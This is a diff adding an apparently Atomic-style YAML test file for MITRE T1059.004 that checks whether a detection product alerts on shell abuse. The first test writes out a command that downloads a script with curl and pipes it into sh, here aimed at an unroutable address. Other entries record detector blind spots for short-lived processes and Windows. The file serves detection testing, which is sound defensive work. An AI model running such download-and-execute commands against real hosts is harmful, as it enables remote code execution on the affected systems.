@@ -1,0 +1,31 @@
+attack_technique: T1059.004
+display_name: "Command and Scripting Interpreter: Unix Shell"
+atomic_tests:
+  - name: A download piped straight into a shell
+    auto_generated_guid: 5a1f0c3e-7d2b-4e8a-9c10-2b3c4d5e0001
+    description: Sigma "Linux Shell Pipe to Shell" shape. The URL is unroutable and the shell lingers so a 1-2 second process look sees it; nothing is downloaded.
+    supported_platforms: [linux, macos]
+    executor:
+      name: sh
+      command: |
+        sh -c 'curl -fsS --max-time 1 http://198.51.100.1/x.sh 2>/dev/null | sh; sleep 6' &
+        echo $! > "$HOME/atomic.pid"
+      cleanup_command: |
+        kill "$(cat "$HOME/atomic.pid")" 2>/dev/null; rm -f "$HOME/atomic.pid"
+    qalaa:
+      expect:
+        event: alert
+        match: { kind: behaviour, rule: download_piped_to_shell, technique: T1059.004 }
+      within_seconds: 15
+
+  - name: Shell from an unexpected parent on Windows
+    auto_generated_guid: 5a1f0c3e-7d2b-4e8a-9c10-2b3c4d5e0002
+    supported_platforms: [windows]
+    executor: { name: powershell, command: "$null" }
+    qalaa: { status: gap, note: "Behaviour rules on Windows need ETW through the admin service (Wave 4.B, next slice)." }
+
+  - name: A one-second command (shorter than the process look)
+    auto_generated_guid: 5a1f0c3e-7d2b-4e8a-9c10-2b3c4d5e0003
+    supported_platforms: [linux, macos]
+    executor: { name: sh, command: "sh -c 'true | sh'" }
+    qalaa: { status: gap, note: "Polling sees programs that run at least 1 s (Linux) or 2 s (macOS). Every start needs the netlink process connector (root helper) or Endpoint Security." }
